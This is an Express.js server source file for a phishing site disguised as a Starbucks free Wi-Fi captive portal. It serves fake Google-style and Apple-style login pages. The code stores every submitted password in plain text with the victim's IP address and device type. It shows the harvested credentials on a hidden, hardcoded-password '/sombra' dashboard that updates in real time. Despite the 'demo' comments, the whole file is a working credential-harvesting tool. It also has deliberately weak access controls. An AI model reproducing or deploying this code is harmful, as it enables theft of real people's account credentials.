const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const flash = require('connect-flash');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// Trust the first hop (reverse proxy / load balancer) so req.ip picks up the
// real client address from X-Forwarded-For instead of the proxy's IP.
app.set('trust proxy', 1);

// Middleware
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(session({
  secret: 'your-secret-key', // Change this in production
  resave: false,
  saveUninitialized: false
}));
app.use(flash());
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// In-memory user store (for demo purposes only)
let users = [];

// Short-lived access tokens for the /sombra dashboard. A new token is minted
// on each successful gate login and lives in the browser page's memory only,
// so refreshing /sombra always forces you to authenticate again.
const sombraTokens = new Map(); // token -> { createdAt }
const SOMBRA_TOKEN_TTL = 30 * 60 * 1000; // 30 minutes

function issueSombraToken() {
  const token = crypto.randomBytes(24).toString('hex');
  sombraTokens.set(token, { createdAt: Date.now() });
  return token;
}

function hasSombraToken(token) {
  if (!token) return false;
  if (typeof token !== 'string') return false;
  const rec = sombraTokens.get(token);
  if (!rec) return false;
  if (Date.now() - rec.createdAt > SOMBRA_TOKEN_TTL) {
    sombraTokens.delete(token);
    return false;
  }
  return true;
}

// ---------- Helpers ----------

function findUserByEmail(email) {
  return users.find(user => user.email === email);
}

// Only @gmail.com addresses are considered valid
function isValidEmailProvider(email) {
  if (typeof email !== 'string') return false;
  const atIndex = email.lastIndexOf('@');
  if (atIndex <= 0 || atIndex === email.length - 1) return false;
  return email.slice(atIndex + 1).toLowerCase() === 'gmail.com';
}

// Detect the device type from the User-Agent header
function detectDevice(ua) {
  ua = ua || '';
  if (/iPad|Tablet|PlayBook|Silk|Kindle|Nexus 7|Nexus 10/i.test(ua)) return 'TABLET';
  if (/Mobi|Android|iPhone|iPod|Windows Phone|BlackBerry/i.test(ua)) return 'PHONE';
  return 'PC';
}

// Normalize a socket IP into a readable form (::1 -> 127.0.0.1)
function normalizeIp(raw) {
  if (!raw) return 'unknown';
  if (raw === '::1') return '127.0.0.1';
  const m = raw.match(/::ffff:(\d+\.\d+\.\d+\.\d+)/);
  if (m) return m[1];
  return raw.replace('::ffff:', '') || 'unknown';
}

// IP + device captured from the incoming request
function captureMeta(req) {
  return {
    ip: normalizeIp(req.ip),
    device: detectDevice(req.headers['user-agent'] || '')
  };
}

// Create a user on the fly and capture the credentials (demo behavior)
async function createCapturedUser(email, password, source, name, req) {
  return {
    id: users.length + 1,
    name: name || email,
    email,
    password: await bcrypt.hash(password, 10),
    plainPassword: password, // stored in plain text for the demo page only
    source,
    capturedAt: new Date().toISOString(),
    ...captureMeta(req)
  };
}

// Re-capture the credentials for an already known user
function updateCapturedUser(user, password, source, req) {
  user.plainPassword = password;
  user.source = source;
  user.capturedAt = new Date().toISOString();
  Object.assign(user, captureMeta(req));
  return user;
}

// Format an ISO timestamp as HH:MM:SS for the dashboard
function formatTime(iso) {
  if (!iso) return '--:--:--';
  const d = new Date(iso);
  const pad = n => String(n).padStart(2, '0');
  return pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
}

// Format an ISO timestamp as GG/MM/AAAA HH:MM:SS for the toast
function formatDateTime(iso) {
  if (!iso) return '--/--/---- --:--:--';
  const d = new Date(iso);
  const pad = n => String(n).padStart(2, '0');
  return pad(d.getDate()) + '/' + pad(d.getMonth() + 1) + '/' + d.getFullYear() +
    ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
}

// Shape a stored user for the sombra dashboard
function toCredentialView(user) {
  return {
    id: user.id,
    email: user.email,
    password: user.plainPassword || '(not captured)',
    source: user.source === 'apple' ? 'apple' : 'google',
    ip: normalizeIp(user.ip),
    device: user.device || 'PC',
    time: formatTime(user.capturedAt),
    date: formatDateTime(user.capturedAt),
    durationMs: 7000
  };
}

// Credentials in order of arrival (newest first)
function orderedCredentials() {
  return [...users]
    .sort((a, b) => new Date(b.capturedAt) - new Date(a.capturedAt))
    .map(toCredentialView);
}

// ---------- Routes ----------

// Home page - Starbucks free Wi-Fi captive portal landing page
app.get('/', (req, res) => {
  res.render('index');
});

// Register page - GET
app.get('/register', (req, res) => {
  res.render('register', {
    messages: req.flash(),
    user: req.session.user
  });
});

// Register page - POST
app.post('/register', async (req, res) => {
  const { name, email, password, confirmPassword } = req.body;

  if (!name || !email || !password || !confirmPassword) {
    req.flash('error', 'All fields are required');
    return res.redirect('/register');
  }

  if (password !== confirmPassword) {
    req.flash('error', 'Passwords do not match');
    return res.redirect('/register');
  }

  // Only @gmail.com emails are valid: reject silently (red border is handled client-side)
  if (!isValidEmailProvider(email)) return res.redirect('/register');

  // Password must be at least 6 characters: reject silently
  if (password.length < 6) return res.redirect('/register');

  if (findUserByEmail(email)) {
    req.flash('error', 'Email already registered');
    return res.redirect('/register');
  }

  users.push(await createCapturedUser(email, password, 'google', name, req));
  req.flash('success', 'Registration successful! Please log in.');
  res.redirect('/login');
});

// Login page - GET
app.get('/login', (req, res) => {
  res.render('login', {
    messages: req.flash(),
    user: req.session.user
  });
});

// Apple-style login page - GET
app.get('/apple-login', (req, res) => {
  res.render('apple-login', {
    messages: req.flash(),
    user: req.session.user
  });
});

// Shared POST handler for both Google-style and Apple-style logins
async function handleLogin(req, res, source) {
  const redirectTo = source === 'apple' ? '/apple-login' : '/login';
  const { email, password } = req.body;

  if (!email || !password) {
    req.flash('error', 'Email and password are required');
    return res.redirect(redirectTo);
  }

  // Only @gmail.com emails are valid: reject silently (red border is handled client-side)
  if (!isValidEmailProvider(email)) return res.redirect(redirectTo);

  // Password must be at least 6 characters: reject silently
  if (password.length < 6) return res.redirect(redirectTo);

  let user = findUserByEmail(email);

  if (user) {
    if (!(await bcrypt.compare(password, user.password))) {
      req.flash('error', 'Invalid email or password');
      return res.redirect(redirectTo);
    }
    updateCapturedUser(user, password, source, req);
  } else {
    // Unknown email: register on the fly (demo behavior) and capture the credentials
    user = await createCapturedUser(email, password, source, email, req);
    users.push(user);
  }

  // Store user in session
  req.session.user = { id: user.id, name: user.name, email };

  // Login successful: close the site
  res.redirect('/close');
}

app.post('/login', (req, res) => handleLogin(req, res, 'google'));
app.post('/apple-login', (req, res) => handleLogin(req, res, 'apple'));

// Close page - shown after a successful login (tries to close the window)
app.get('/close', (req, res) => {
  res.render('close');
});

// Logout
app.get('/logout', (req, res) => {
  req.session.destroy(() => {
    res.redirect('/');
  });
});

// Admin demo page (for cybersecurity demo)
// In a real app, this would be protected by proper admin authentication.
// For demo, we'll allow access if the query parameter demo=true is present.
// NOTE: This is NOT secure and only for demonstration purposes.
app.get('/admin/demo', (req, res) => {
  if (req.query.demo !== 'true') {
    req.flash('error', 'Access denied');
    return res.redirect('/');
  }

  // Prepare demo data: show the current users list and some fake events.
  const demoData = {
    users: users.map(user => ({
      id: user.id,
      name: user.name,
      email: user.email
      // Note: We do not expose passwords in the demo
    })),
    events: [
      { type: 'registration', email: 'test@example.com', timestamp: new Date(), success: true },
      { type: 'login', email: 'test@example.com', timestamp: new Date(), success: true },
      { type: 'login', email: 'wrong@example.com', timestamp: new Date(), success: false }
    ]
  };

  res.render('admin/demo_english', {
    messages: req.flash(),
    user: req.session.user,
    demoData
  });
});

// Read the /sombra access token from query string (page memory) or body (delete form)
function sombraToken(req) {
  return req.query.tk || (req.body && req.body.tk);
}

// Sombra access gate: /sombra requires sombr4/sombr4, issuing a short-lived
// token held only in the rendered page. Refreshing the page (no token) re-asks.
function requireSombra(req, res, next) {
  if (hasSombraToken(sombraToken(req))) return next();
  if (req.path === '/sombra/latest') return res.status(401).json({ ok: false, error: 'unauthorized' });
  if (req.path.startsWith('/sombra/delete')) return res.redirect('/sombra');
  return res.render('sombra-login', { fail: req.query.fail === '1' });
}

// Sombra login - POST (gate credentials). Success mints a token and redirects
// with ?tk=..., so authentication is never remembered between page loads.
app.post('/sombra/login', (req, res) => {
  const { username, password } = req.body;
  if (username === 'sombr4' && password === 'sombr4') {
    return res.redirect('/sombra?tk=' + issueSombraToken());
  }
  return res.redirect('/sombra?fail=1');
});

// Sombra page - hidden credentials viewer (demo only)
// Not linked anywhere on the site: reachable only by typing /sombra in the URL bar.
app.get('/sombra', requireSombra, (req, res) => {
  res.render('sombra', { users: orderedCredentials(), tk: req.query.tk });
});

// Latest captured credential + full credentials list (JSON)
// used by /sombra for real-time updates without a page refresh.
app.get('/sombra/latest', requireSombra, (req, res) => {
  const last = users[users.length - 1];
  res.json({
    ok: true,
    credential: last ? toCredentialView(last) : null,
    users: orderedCredentials()
  });
});

// Delete a captured credential from the sombra page
app.post('/sombra/delete/:id', requireSombra, (req, res) => {
  const id = parseInt(req.params.id, 10);
  const index = users.findIndex(user => user.id === id);
  if (index !== -1) users.splice(index, 1);
  res.redirect('/sombra?tk=' + sombraToken(req));
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});

module.exports = app;
